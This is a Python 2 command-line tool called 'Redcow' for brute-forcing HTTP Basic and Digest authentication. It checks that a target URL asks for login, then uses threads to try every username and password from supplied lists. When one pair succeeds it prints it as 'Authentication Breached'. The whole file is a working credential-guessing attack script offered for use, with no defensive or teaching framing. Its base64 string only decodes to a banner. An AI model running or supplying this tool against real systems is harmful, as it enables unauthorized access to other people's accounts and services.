#!/usr/bin/env python2

import requests
import argparse
import os.path
import base64
import sys
import re

from requests.auth import HTTPDigestAuth
from threading import Thread
from Queue import Queue
from time import sleep

class Redcow():

    def __init__(self, url, userlist, passlist, workers):
        self.url = str(url)
        self.userlist = self._parse_list(userlist)
        self.passlist = self._parse_list(passlist)
        self.workers = int(workers)
        self.auth_scheme = ''
        self.auth_realm = ''
        self.queue_creds = Queue(maxsize=0)
        self.queue_print = Queue(maxsize=0)
        self.thread = []

        self._motd()
        self._load_creds()

        sys.stdout.write('\n')
        msg = "[+] Checking for HTTP authentication at URL '%s' - " % self.url
        sys.stdout.write('%s\r' % msg)
        sys.stdout.flush()

        try:
            r = requests.get(self.url)
        except requests.exceptions.RequestException:
            msg = msg + "\033[91m\033[1mERROR\033[0m"
            sys.stdout.write('%s\r' % msg)
            sys.stdout.flush()
            sys.stdout.write('\n')
            print "[x] ---> URL: '%s' replied with a 'Connection Refused' status. Exiting." % self.url
            sys.exit(2)

        if not r.status_code == 401:
            msg = msg + "\033[91m\033[1mERROR\033[0m"
            sys.stdout.write('%s\r' % msg)
            sys.stdout.flush()
            #sys.stdout.write('\n')
            print "[x] URL '%s' did not reply with HTTP authentication request. Exiting." % self.url
            sys.exit(2)
        else:
            msg = msg + "\033[92m\033[1mDONE!\033[0m"
            sys.stdout.write('%s\r' % msg)
            sys.stdout.flush()
            #sys.stdout.write('\n')
            http_auth_string = r.headers['www-authenticate']
            http_auth_objects = re.compile(r'''(?:\s*www-authenticate\s*:)?\s*(\w*)\s+realm=['"]([^'"]+)['"]''', re.IGNORECASE)
            http_match_object = http_auth_objects.match(http_auth_string)
            self.auth_scheme = http_match_object.group(1).lower()
            self.auth_realm = http_match_object.group(2).lower()

            if self.auth_scheme == 'basic' or 'digest':
                print '\n'
                print "\t[INFO] - HTTP Authentication schema detected: '\033[1m%s\033[0m'\n" % self.auth_scheme.capitalize()
                print "\t[INFO] - HTTP Authentication realm detected:  '\033[1m%s\033[0m'\n" % self.auth_realm.capitalize()
                print "\t[INFO] - Creating %s threads for breach attempt.\n" % str(self.workers)

            for worker in xrange(self.workers):
                thread = Thread(target=self._break_auth)
                thread.daemon = True
                #print "Starting thread # %s" % str(worker)
                thread.start()

    def _parse_list(self, x):
        if os.path.isfile(x): return ([line.rstrip('\n') for line in open(x)])
        else: return list([x])

    def _motd(self):
        data00 = "G1s5Mm0NCg0KICBfICAgICAgXyAgICAgICAgIF8gICAgICAgICAgICAgICAgICBfICAgICAgICAgXyAgICAgICAgICAgIF8gICAgICAgICAgICAgXyAgICAgIA0KL18vXCAgICAvXCBcICAgICAvIC9cICAgICAgICAgICAgICAgIC9cIFwgICAgICAvIC9cICAgICAgICAgL1wgXCAgICAgICAgIC9cIFwgICAgIA0KXCBcIFwgICBcIFxfXCAgIC8gLyAgXCAgICAgICAgICAgICAgLyAgXCBcICAgIC8gLyAgXCAgICAgICAvICBcIFwgICAgICAgLyAgXCBcICAgIA0KIFwgXCBcX18vIC8gLyAgLyAvIC9cIFwgICAgICAgICAgICAvIC9cIFwgXCAgLyAvIC9cIFxfXyAgIC8gL1wgXCBcICAgICAvIC9cIFwgXCAgIA0KICBcIFxfXyBcL18vICAvIC8gL1wgXCBcICAgICAgICAgIC8gLyAvXCBcX1wvIC8gL1wgXF9fX1wgLyAvIC9cIFxfXCAgIC8gLyAvXCBcIFwgIA0KICAgXC9fL1xfXy9cIC9fLyAvICBcIFwgXCAgICAgICAgLyAvXy9fIFwvXy9cIFwgXCBcL19fXy8vIC9fL18gXC9fLyAgLyAvIC8gIFwgXF9cIA0KICAgIF8vXC9fX1wgXFwgXCBcICAgXCBcIFwgICAgICAvIC9fX19fL1wgICAgXCBcIFwgICAgIC8gL19fX18vXCAgICAvIC8gLyAgICBcL18vIA0KICAgLyBfL18vXCBcIFxcIFwgXCAgIFwgXCBcICAgIC8gL1xfX19fXC9fICAgIFwgXCBcICAgLyAvXF9fX19cLyAgIC8gLyAvICAgICAgICAgIA0KICAvIC8gLyAgIFwgXCBcXCBcIFxfX19cIFwgXCAgLyAvIC8gICAgIC9fL1xfXy8gLyAvICAvIC8gL19fX19fXyAgLyAvIC9fX19fX19fXyAgIA0KIC8gLyAvICAgIC9fLyAvIFwgXC9fX19fXCBcIFwvIC8gLyAgICAgIFwgXC9fX18vIC8gIC8gLyAvX19fX19fX1wvIC8gL19fX19fX19fX1wgIA0KIFwvXy8gICAgIFxfXC8gICBcX19fX19fX19fXC9cL18vICAgICAgICBcX19fX19cLyAgIFwvX19fX19fX19fXy9cL19fX19fX19fX19fXy8gIA0KDQobWzBtDQobWzkxbSAgICAgICAgICAgICAgICAgW1JFRENPVzogaHR0cCBhdXRoZW50aWNhdGlvbiBicnV0ZWZvcmNlIHRvb2xdDQobWzBtDQogICAgICAgICAgICAgICAgICAgICAgIGJ5OiAweDY0NjQ1ZkBwcm90b25tYWlsLmNvbQ0KDQo="
        print(base64.b64decode(data00))

    def _load_creds(self):
        msg = "[+] Building a list of credentials with user supplied data - "
        sys.stdout.write('%s\r' % msg)
        sys.stdout.flush()
        for _user in self.userlist:
            for _pass in self.passlist:
                creds = dict(username=_user, password=_pass)
                self.queue_creds.put(creds)
        msg = msg + "\033[92m\033[1mDONE!\033[0m"
        sys.stdout.write('%s\r' % msg)
        sys.stdout.flush()
        sys.stdout.write('\n')

    def _strip_quotes(self, x):
        if x.startswith('"') and x.endswith('"'):
            return x[1:-1]
        else: return x

    def printQueue(self):
        while True:
            if self.queue_print.empty() is not True:
                msg = self.queue_print.get()
                sys.stdout.write('%s\r' % msg)
                sys.stdout.flush()
                self.queue_print.task_done()
            else:
                sleep(0.15)

    def _break_auth(self):
        while True:
            if self.queue_creds.empty() is not True:
                creds = self.queue_creds.get()
                msg = "[+] Attempting authentication - "
                self.queue_print.put(msg)
                sleep(0.1)

                if self.auth_scheme == 'basic':
                    r = requests.post(self.url, auth=(creds["username"], creds["password"]))
                elif self.auth_scheme == 'digest':
                    r = requests.post(self.url, auth=HTTPDigestAuth(creds["username"], creds["password"]))
                else:
                    print "Error. Exiting"
                    sys.exit(1)

                if r.status_code == 200:
                    msg = msg + "\033[92m\033[1mSUCCESS!\033[0m"
                    self.queue_print.put(msg)
                    sleep(0.2)
                    print '\n'
                    print "[!] '%s' \033[92m\033[1mAuthentication Breached\033[0m using User: '\033[1m%s\033[0m' and Password: '\033[1m%s\033[0m'\n" % (self.auth_scheme.capitalize(), creds['username'], creds['password'])
                    sys.exit(1)
                else:
                    self.queue_creds.task_done()
                    del creds
            else:
                sleep(0.25)
                break

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    auth_group = parser.add_argument_group("Required Arguments")
    auth_group.add_argument('-t', required="true", dest="target_url", help="Target URL running Web Authentication")
    auth_group.add_argument('-u', required="true", dest="userlist", help="A username *OR* a file containing a list of users")
    auth_group.add_argument('-p', required="true", dest="passlist", help="A password *OR* a file containing a list of passwords")
    parser.add_argument('--threads', dest="threads", help="(Optional) Number of Threads to use. Default: 1")
    args = parser.parse_args()

    if not args.threads: args.threads = 1
    Moo = Redcow(args.target_url, args.userlist, args.passlist, args.threads)
    oQueue = Thread(target=Moo.printQueue)
    oQueue.daemon = True
    oQueue.start()
    Moo.queue_creds.join()
    Moo.queue_print.join()
